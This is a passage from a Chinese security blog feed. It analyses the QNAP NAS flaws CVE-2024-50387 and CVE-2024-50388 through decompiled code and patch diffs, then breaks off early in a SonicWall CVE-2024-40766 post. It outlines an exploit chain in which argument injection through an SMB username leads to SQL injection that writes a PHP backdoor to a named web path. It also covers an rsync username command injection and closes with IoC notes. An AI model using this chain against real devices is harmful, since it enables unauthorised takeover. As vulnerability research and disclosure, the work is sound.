<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="built_in">memcpy</span>(</span><br><span class="line">    v29,</span><br><span class="line">    <span class="string">&quot;INSERT INTO NASLOG_CONN ( conn_type, conn_date, conn_time, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_&quot;</span></span><br><span class="line">    <span class="string">&quot;action, conn_app, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) VALUES ( ?, strftime(&#x27;%Y-&quot;</span></span><br><span class="line">    <span class="string">&quot;%m-%d&#x27;, CURRENT_TIMESTAMP, &#x27;LOCALTIME&#x27;), strftime(&#x27;%H:%M:%S&#x27;, CURRENT_TIMESTAMP, &#x27;LOCALTIME&#x27;), ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ? );&quot;</span>,</span><br><span class="line">    <span class="number">0x16A</span>uLL);</span><br><span class="line">v6 = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v27) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">sqlite3_busy_timeout(v27, <span class="number">20000LL</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sqlite3_prepare(v27, v29, <span class="number">0xFFFFFFFF</span>LL, &amp;v28, <span class="number">0LL</span>) &amp;&amp; !sqlite3_exec(v27, <span class="string">&quot;BEGIN TRANSACTION;&quot;</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>) )</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">sqlite3_close(v27);</span><br><span class="line"><span class="keyword">if</span> ( v6 == <span class="number">6</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967267LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">&#123;</span><br><span class="line">  ++v6;</span><br><span class="line">  unlink(<span class="string">&quot;/etc/logs/conn.log&quot;</span>);</span><br><span class="line">  naslog_conn_create_tbl(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  ++v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v27) )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>但是这个函数拼接 SQL 语句时使用了预编译，无法进行 SQL 注入，因此漏洞点可能不在这一条路径上面。</p>
<p>回到 <code>log_tool</code> 中，当没有传入 <code>-S</code> 参数时，代码会在 <code>[4]</code> 处调用 <code>naslog_conn_add2</code>，这个函数也位于 <code>libuLinux_naslog.so.2.0.0</code> 中</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">v14 = sqlite3_mprintf(</span><br><span class="line">  <span class="string">&quot;INSERT INTO NASLOG_CONN \t( conn_type, conn_user, conn_ip, conn_comp, conn_res, conn_serv, conn_action, conn_a&quot;</span></span><br><span class="line">  <span class="string">&quot;pp, conn_action_result, conn_client_id, conn_client_app, conn_client_agent ) \tVALUES \t( %d, &#x27;%s&#x27;, &#x27;%s&#x27;, &#x27;%s&#x27;&quot;</span></span><br><span class="line">  <span class="string">&quot;, &#x27;%s&#x27;, %d, %d, &#x27;%s&#x27;, %d, %Q, %Q, %Q);&quot;</span>,</span><br><span class="line">  v11,</span><br><span class="line">  v1,</span><br><span class="line">  a1 + <span class="number">129</span>,</span><br><span class="line">  a1 + <span class="number">194</span>,</span><br><span class="line">  v78,</span><br><span class="line">  v12,</span><br><span class="line">  v13,</span><br><span class="line">  v56,</span><br><span class="line">  v57,</span><br><span class="line">  v58,</span><br><span class="line">  v59,</span><br><span class="line">  v60);</span><br><span class="line"><span class="keyword">if</span> ( sqlite3_open(<span class="string">&quot;/etc/logs/conn.log&quot;</span>, &amp;v65) )</span><br><span class="line">&#123;</span><br><span class="line">sqlite3_free(v14);</span><br><span class="line"><span class="keyword">return</span> <span class="number">4294967276LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sqlite3_busy_timeout(v65, <span class="number">20000LL</span>);</span><br><span class="line">LODWORD(modes) = sqlite3_exec(v65, v14, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>那么很明显，函数在拼接 SQL 语句时使用了不安全的 <code>%s</code> 参数，是存在 SQL 注入风险的。其中 INSERT 语句的 <code>conn_app</code> 列就是外部传入的 <code>-A</code> 参数值。</p>
<p>到这里我们就找到了公告中提到的两个漏洞点，参数注入导致 SQL 注入，但是还存在一些关键问题需要解决。</p>
<ol>
<li>执行 <code>log_tool</code> 命令时默认是带有 <code>-S</code> 参数的，导致无法调用到 <code>naslog_conn_add2</code> 函数，不能触发 SQL 注入。</li>
<li>假设可以触发 SQL 注入，考虑到目标数据库是 sqlite，利用思路应该是写 web 后门。那么这个后门应该写入到系统哪个位置才能触发。</li>
</ol>
<p>第一个问题，观察 <code>sub_A880</code> 拼接命令的代码，使用了 snprintf 函数，最大长度为 0x800。那么第一个思路是能否通过传入超长的用户名或主机名，让格式化字符串中的 <code>-S</code> 参数被截断。查看 Samba 源代码发现，用户名最大长度为 0x200，主机名最大长度为 256，因此无法截断参数。</p>
<p>另一个思路就是从命令本身出发，能否传入某些字符将后续的参数屏蔽。我想到使用 <code>#</code> 字符来注释后续参数，形成类似如下的命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;test&#x27;</span> -A <span class="string">&quot;sql_payload&quot;</span> -p <span class="string">&#x27;127.0.0.1&#x27;</span> -m <span class="string">&#x27;linux&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> <span class="comment"># &#x27;dummy&#x27; -p &#x27;192.168.x.x&#x27; -m &#x27;xxx&#x27; -i 1 -n 9 -a &#x27;---&#x27; -S</span></span><br></pre></td></tr></table></figure></div>

<p>但 <code>escape_shell_string</code> 会在 <code>#</code> 前面也添加反斜杠转义，导致注释失败。</p>
<p>smbrun 最终是调用 <code>sh -c</code> 执行命令的，所以可以考虑一些 SHELL 中特性，当在一条命令中使用 <code>--</code>，即两个短横线时，表示命令选项结束，后续的内容会被认为是普通数据。所以我们可以构造这样的命令</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">/usr/local/samba/sbin/log_ratelimit.sh -t 1 -u <span class="string">&#x27;test&#x27;</span> -A <span class="string">&quot;sql_payload&quot;</span> -p <span class="string">&#x27;127.0.0.1&#x27;</span> -m <span class="string">&#x27;linux&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -- <span class="string">&#x27;dummy&#x27;</span> -p <span class="string">&#x27;192.168.x.x&#x27;</span> -m <span class="string">&#x27;xxx&#x27;</span> -i 1 -n 9 -a <span class="string">&#x27;---&#x27;</span> -S</span><br></pre></td></tr></table></figure></div>

<p>这样从 dummy 开始的内容都不会被认为是命令选项，就可以屏蔽 <code>-S</code> 参数，最终使 <code>log_tool</code> 调用 <code>naslog_conn_add2</code> 函数。</p>
<p>后续的利用思路就很简单了，在 <code>-A</code> 之后插入 SQL 注入的 payload，可以写入 PHP 后门文件。那么应该将后门放在哪里才能解析？</p>
<p>本博客曾经<a href="https://wzt.ac.cn/2023/02/06/CVE-2022-27596/">复现过</a> QNAP 的一个 SQL 注入漏洞，当时提供的思路为结合 MusicStation 或 VideoStation 等 PHP 编写的插件来利用。实际上在系统本身的 Web 服务中，某些路径下也可以解析 PHP 代码。例如 <code>/mnt/ext/opt/QuLog/opt/www/</code>，在该目录下放置一个 PHP 文件，访问即可执行且不需要进行身份验证。</p>
<p>那么简单总结一下该漏洞的利用条件和思路</p>
<ol>
<li>首先需要能够访问到系统的 SMB 以及 Web 服务，并且这个 SMB 服务应该是 SMB Service 插件启动的</li>
<li>利用参数注入漏洞，通过用户名向命令中插入 <code>-A</code> 以及 <code>--</code>，在 <code>-A</code> 参数中布置 SQL 注入 payload</li>
<li>触发 SQL 注入漏洞，向 <code>/mnt/ext/opt/QuLog/opt/www/</code> 目录下写入了 PHP 后门文件</li>
<li>访问后门实现任意命令执行</li>
</ol>
<h1 id="CVE-2024-50388"><a href="#CVE-2024-50388" class="headerlink" title="CVE-2024-50388"></a>CVE-2024-50388</h1><p>根据<a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-41" >官方公告<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，该漏洞影响 QNAP NAS 中的 HBS3 插件，这个插件是用来将本地和云端数据进行同步的，也是 QNAP NAS 中使用非常广泛的一个插件。根据 ZDI 在比赛中发布的<a class="link"   href="https://www.bleepingcomputer.com/news/security/qnap-fixes-nas-backup-software-zero-day-exploited-at-pwn2own/" >信息<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，可以知道这是一个命令注入漏洞。</p>
<p>依旧是下载新版插件进行补丁对比，HBS3 的大部分组件都是用 Python 编写的，而新版本中这些文件被编译成 python3.11 版本的字节码，目前似乎还没有能够完全反编译的工具。不过通过分析，该漏洞可能并不是位于 python 代码中，对比发现新版的 rsync 等程序也发生了变化。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Old</span></span><br><span class="line"><span class="built_in">sprintf</span>(v22, <span class="string">&quot;%s %s \&quot;%s\&quot; %s \&quot;%s\&quot;&quot;</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, v19, <span class="string">&quot;-s&quot;</span>, v20);</span><br><span class="line">v14 = popen(v22, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">v15 = v14;</span><br><span class="line"><span class="keyword">if</span> ( v14 )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( fgets(v21, <span class="number">64</span>, v14) )</span><br><span class="line">&#123;</span><br><span class="line">  v16 = <span class="built_in">strchr</span>(v21, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    *v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = strtol(v21, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v17 = <span class="number">-6</span>;</span><br><span class="line">&#125;</span><br><span class="line">pclose(v15);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v17;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// New</span></span><br><span class="line"><span class="built_in">sprintf</span>(s, <span class="string">&quot;%s %s \&quot;%s\&quot; %s \&quot;%s\&quot;&quot;</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, en_username, <span class="string">&quot;-p&quot;</span>, password);</span><br><span class="line">result = mkstemp(templatea);</span><br><span class="line"><span class="keyword">if</span> ( result != <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">close(result);</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line">sub_42C100(templatea, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;/sbin/rsync_util&quot;</span>, <span class="string">&quot;-u&quot;</span>, en_username, <span class="string">&quot;-p&quot;</span>);</span><br><span class="line">v4 = fopen(templatea, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v4 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( !feof(v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( fgets(nptr, <span class="number">65</span>, v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">strchr</span>(nptr, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">        *v5 = <span class="number">0</span>;</span><br><span class="line">      v3 = strtol(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( feof(v4) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_8:</span><br><span class="line">  fclose(v4);</span><br><span class="line">&#125;</span><br><span class="line">unlink(templatea);</span><br><span class="line"><span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure></div>

<p>很明显，旧版代码拼接命令之后直接使用 popen 来执行，而新版改为使用 <code>sub_42C100</code> 函数，其内部实际上是调用 execve 参数化执行，避免能够直接注入命令。</p>
<p>rsync 这个服务默认情况下是关闭的，需要手动在 HBS3 插件中开启，开启之后程序会监听 873 端口。</p>
<p>下面需要简单了解一下 rsync，弄清楚在什么情况下可以触发到这个命令注入。rsync 是一种 Linux 下的远程数据同步工具，可以快速在两台主机之间同步文件，能够用来实现文件备份等操作，这种服务可能在企业场景下会有更多使用。</p>
<p>它在服务端和客户端之间使用 “rsync 算法” 来同步文件，由于某些原因，两端通信使用的协议并没有被标准化，而且实现了 rsync 的开源项目也比较少，可以参考 <a class="link"   href="https://rsync.samba.org/how-rsync-works.html" >samba 提供的文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>以及抓包来大致了解协议结构。</p>
<p>首先我们分析一下漏洞点，它是在 <code>auth_server</code> 函数中被调用的</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( RConf_Get_Field(<span class="string">&quot;/etc/config/rsyncd.conf&quot;</span>, <span class="number">4705734LL</span>, <span class="string">&quot;HBS3 AuthMode&quot;</span>, auth_mode, <span class="number">64LL</span>) )</span><br><span class="line">  sub_45AB70(auth_mode, <span class="number">64LL</span>, <span class="number">0x472BE2</span>LL, <span class="string">&quot;RSYNC&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC&quot;</span>, auth_mode) || !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC_AND_NAS&quot;</span>, auth_mode) )</span><br><span class="line">&#123;</span><br><span class="line">  v55 = qword_6A5DC0;</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">  <span class="keyword">if</span> ( !qword_6A5DC0 )</span><br><span class="line">    v55 = <span class="string">&quot;/etc/config/rsyncd.conf&quot;</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, v55, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync user&quot;</span>, rsync_user, <span class="number">65LL</span>) )</span><br><span class="line">    <span class="built_in">strcpy</span>(rsync_user, <span class="string">&quot;rsync&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync enpswd&quot;</span>, rsync_encpwd, <span class="number">513LL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( RConf_Get_Field(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync pswd&quot;</span>, rsync_pwd, <span class="number">129LL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(src, <span class="string">&quot;rsync&quot;</span>, <span class="number">0x81</span>uLL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sprintf</span>(command, <span class="string">&quot;/sbin/get_encstr %s e 2&gt;/dev/null&quot;</span>, rsync_pwd);</span><br><span class="line">      v56 = popen(command, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      v57 = v56;</span><br><span class="line">      <span class="keyword">if</span> ( v56 )</span><br><span class="line">      &#123;</span><br><span class="line">        fgets(rsync_encpwd, <span class="number">513</span>, v56);</span><br><span class="line">        pclose(v57);</span><br><span class="line">      &#125;</span><br><span class="line">      rsync_encpwd[<span class="built_in">strlen</span>(rsync_encpwd)] = <span class="number">0</span>;</span><br><span class="line">      sub_42B690(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync enpswd&quot;</span>, rsync_encpwd);</span><br><span class="line">      sub_42B740(dest, <span class="number">4705734LL</span>, <span class="string">&quot;rsync pswd&quot;</span>);</span><br><span class="line">      v58 = Decrypt_Rsync_Password(rsync_encpwd, src, <span class="number">129LL</span>);</span><br><span class="line">      v59 = <span class="number">342</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v58 &lt; <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_77;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v58 = Decrypt_Rsync_Password(rsync_encpwd, src, <span class="number">129LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v58 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v59 = <span class="number">349</span>;</span><br><span class="line">LABEL_77:</span><br><span class="line">      sub_429040(<span class="number">3LL</span>, <span class="string">&quot;decrypt password fail (%d), L%d\n&quot;</span>, v58, v59);</span><br><span class="line">      <span class="keyword">return</span> __strdup(username);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *v97 = <span class="number">0LL</span>;</span><br><span class="line">  v98 = <span class="number">0LL</span>;</span><br><span class="line">  v99 = <span class="number">0LL</span>;</span><br><span class="line">  v100 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v106, <span class="number">0</span>, <span class="keyword">sizeof</span>(v106));</span><br><span class="line">  v73 = <span class="built_in">strcpy</span>(v106, src);</span><br><span class="line">  sub_456A90(v73, v96, v97);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(rsync_user, username) &amp;&amp; !<span class="built_in">strcmp</span>(v97, password) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_42C840(<span class="number">0</span>, a5, <span class="number">0LL</span>, a7, a8, a9, a10, v53, v54, a13, a14);</span><br><span class="line">    <span class="keyword">return</span> __strdup(username);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( auth_mode[<span class="number">0</span>] != <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_109;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( auth_mode[<span class="number">0</span>] != <span class="string">&#x27;N&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_110;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( auth_mode[<span class="number">1</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; auth_mode[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span> &amp;&amp; !auth_mode[<span class="number">3</span>] )</span><br><span class="line">  <span class="keyword">goto</span> nas_auth;</span><br><span class="line">LABEL_109:</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(<span class="string">&quot;RSYNC_AND_NAS&quot;</span>, auth_mode) )</span><br><span class="line">&#123;</span><br><span class="line">nas_auth:</span><br><span class="line">  v75 = dword_6A6074;</span><br><span class="line">  v74 = dword_6A5EC4;</span><br><span class="line">LABEL_112:</span><br><span class="line">  v76 = sub_4105C0();</span><br><span class="line">  sub_429040(<span class="number">6LL</span>, <span class="string">&quot;%s:L%d [%s] check nas account, d[%d] s[%d]\n&quot;</span>, <span class="string">&quot;auth_server&quot;</span>, <span class="number">374</span>, v76, v74, v75);</span><br><span class="line">  <span class="keyword">if</span> ( (a3 != <span class="number">-1</span> || dword_6A6070 || dword_6A6074 != <span class="number">1</span> || dword_6A5EC4 != <span class="number">-1</span> || dword_694F1C != <span class="number">1</span> || dword_6A6078)</span><br><span class="line">    &amp;&amp; (check_nas_pwd(username, password) || sub_42B900(username) != <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_42C840(<span class="number">1</span>, a5, username, a7, a8, a9, a10, v77, v78, a13, a14);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></div>

<p>根据函数名称以及部分代码推断，进行 rsync 身份验证时可能会调用到漏洞函数 (<code>check_nas_pwd</code>)，而且传入的参数为用户名和密码。</p>
<p>通过抓包和静态分析代码，客户端在连接 rsync 服务端进行身份验证时，可能会进行以下几个步骤</p>
<ol>
<li>服务端发送 <code>@RSYNCD</code>，表明自己的版本，以及支持的身份验证 hash 算法</li>
<li>客户端发送 <code>@RSYNCD</code>，表明自己的版本，选定一个 hash 算法</li>
<li>服务器发送 <code>AUTHREQD</code>，要求密码认证</li>
<li>客户端将账户信息发送到服务端</li>
</ol>
<p>因此可以推断，客户端发送用户名和密码时，就会调用到漏洞函数，如果在用户名中直接构造命令注入 payload，就能实现任意命令执行。所以利用该漏洞的条件和思路应该是</p>
<ol>
<li>设备开启了 rsync 服务，能够访问到 873 端口</li>
<li>向服务器发送认证信息，在用户名处构造命令注入 payload</li>
</ol>
<h1 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h1><p>利用这些漏洞可能会在系统中留下日志信息，我在这里做一些简单的记录。</p>
<p>利用 CVE-2024-50387 SMB 漏洞时，如果在 QuLog Center 系统日志中心开启了 SMB 日志记录，可能会看到如下日志信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">警告  2024-11-20  18:00:00  WORKGROUP\test  192.168.0.100  linux  ---  ---  SMB  ---  登录失败</span><br></pre></td></tr></table></figure></div>

<p>或者查看 <code>/var/nc.log</code> 是否存在 SMB 登录失败等信息。不过考虑到攻击者可以注入任意参数，或者在获取系统权限之后擦除日志，所以以上仅能作为简单的参考，还可以排查 WEB 路径下是否多出了未知的 PHP 文件。</p>
<p>系统日志中心似乎并不记录和 rsync 相关的日志，因此排查 CVE-2024-50388 的利用可以关注设备是否外联了异常 IP 地址，系统是否存在可疑文件等。</p>
<p>值得一提的是，两个漏洞分别影响 SMB 和 rsync 服务，这些服务可能不会开放在公网环境，受影响的插件版本也有限。此外，QNAP 在漏洞被发现后迅速采取了行动，推出新版本进行修复。而且，当 NAS 连接网络时，还会自动下载 Hot Patch 作为临时缓解方案。在这些努力下，这些漏洞被利用的可能性较低，但依然建议用户将相关组件升级到最新版，确保安全。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a class="link"   href="https://unix.stackexchange.com/questions/11376/what-does-double-dash-double-hyphen-mean" >https://unix.stackexchange.com/questions/11376/what-does-double-dash-double-hyphen-mean<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-41" >https://www.qnap.com/en/security-advisory/qsa-24-41<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.qnap.com/en/security-advisory/qsa-24-42" >https://www.qnap.com/en/security-advisory/qsa-24-42<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.bleepingcomputer.com/news/security/qnap-patches-second-zero-day-exploited-at-pwn2own-to-get-root/" >https://www.bleepingcomputer.com/news/security/qnap-patches-second-zero-day-exploited-at-pwn2own-to-get-root/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://rsync.samba.org/how-rsync-works.html" >https://rsync.samba.org/how-rsync-works.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-40766</title>
    <url>/2024/09/05/CVE-2024-40766/</url>
    <content><![CDATA[<p>2024 年 8 月 23 日，Sonicwall 发布了 CVE-2024-40766 漏洞预警信息，该漏洞被描述为 “访问控制不当”。可能造成未授权访问或导致系统崩溃，本文对此漏洞进行简要分析。</p>
<p><strong>该漏洞可能已被在野利用，建议用户立即安装补丁，检查设备 SSLVPN 用户情况，并应用 SonicWall 提供的缓解措施。</strong></p>
<span id="more"></span>

<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>根据公开信息，该漏洞似乎仅影响 SonicWall 防火墙的硬件设备，影响 GEN5、GEN6 以及 GEN7 小于等于 7.0.1-5035 版本。</p>
<p>公告描述这可能是一个验证绕过漏洞，但我们找到 GEN5 系列的更新公告，其中提到新版本仅进行了一项修复：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">SonicOS unauthenticated stack-based buffer overflow vulnerability (SNWLD-2024-0015). GEN5-73</span><br></pre></td></tr></table></figure></div>

<p>所以这个漏洞可能是一个未授权栈溢出，通过溢出覆盖了某些关键结构导致身份验证绕过。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>GEN5 系列更新的项目较少，我们选择它为目标进行补丁对比，GEN5 只提供 sig 格式的升级包，但通过之前的文章已经知道 sig 文件的解密方法，所以直接选择最近两个版本解密来分析。</p>
<p>解密 5.9.2.14-12o 和 5.9.2.14-13o 两个版本的固件，使用 binwalk 分析解密后固件格式</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">405           0x195           Zlib compressed data, default compression</span><br><span class="line">7517022       0x72B35E        Squashfs filesystem, big endian, version 3.0, size: 3973792 bytes, 1439 inodes, blocksize: 16384 bytes, created: 2022-04-07 09:48:41</span><br><span class="line">11494238      0xAF635E        ELF, 32-bit N32 MSB MIPS32 executable, MIPS, version 1 (SYSV)</span><br><span class="line">14003246      0xD5AC2E        CRC32 polynomial table, big endian</span><br><span class="line">14004293      0xD5B045        Copyright string: &quot;Copyright 1995-2002 Jean-loup Gailly &quot;</span><br><span class="line">14007301      0xD5BC05        Copyright string: &quot;Copyright 1995-2002 Mark Adler &quot;</span><br><span class="line">14125788      0xD78ADC        HTML document header</span><br><span class="line">14126380      0xD78D2C        HTML document footer</span><br><span class="line">14139070      0xD7BEBE        PEM certificate</span><br><span class="line">14140150      0xD7C2F6        PEM certificate</span><br><span class="line">14141486      0xD7C82E        PEM RSA private key</span><br><span class="line">14157054      0xD804FE        Ubiquiti firmware header, third party, ~CRC32: 0x0, version: &quot;SSL_malloc Error&quot;</span><br><span class="line">14265550      0xD9ACCE        SHA256 hash constants, big endian</span><br><span class="line">14275478      0xD9D396        AES Inverse S-Box</span><br><span class="line">14297270      0xDA28B6        Base64 standard index table</span><br><span class="line">14654307      0xDF9B63        gzip compressed data, has comment: &quot;&quot;, from FAT filesystem (MS-DOS, OS/2, NT), last modified: 1970-01-13 13:14:07 (bogus date)</span><br><span class="line">14713500      0xE0829C        Intel x86 or x64 microcode, sig 0x0000b806, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14714780      0xE0879C        Intel x86 or x64 microcode, sig 0x3f800833, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 16384</span><br><span class="line">14716412      0xE08DFC        Intel x86 or x64 microcode, sig 0x00002879, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14717308      0xE0917C        Intel x86 or x64 microcode, sig 0x3f8068aa, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 16384</span><br><span class="line">14717884      0xE093BC        Intel x86 or x64 microcode, sig 0x000060db, pf_mask 0x00, 1F00-01-10, rev 0x1d00, size 2048</span><br><span class="line">14722300      0xE0A4FC        Intel x86 or x64 microcode, sig 0x0000b0ce, pf_mask 0x00, 1F00-02-10, rev 0x1d00, size 2048</span><br><span class="line">14723036      0xE0A7DC        Intel x86 or x64 